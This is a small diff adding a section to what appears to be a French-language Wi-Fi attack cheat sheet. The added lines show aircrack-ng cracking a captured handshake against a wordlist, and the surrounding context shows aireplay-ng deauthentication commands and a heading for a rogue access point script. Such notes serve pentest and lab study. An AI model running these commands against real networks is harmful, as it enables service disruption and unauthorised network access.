@@ -241,6 +241,11 @@ sudo aireplay-ng --deauth 30 -a <mac AP> wlan1
 sudo aireplay-ng --deauth 30 -a <mac AP> -c <mac Client> wlan1
 ```
 
+### brute force d'un handshake capturé
+
+```sh
+aircrack-ng.exe -w wordlist.txt file.cap
+```
 
 ### Script pour un rogue access point
 
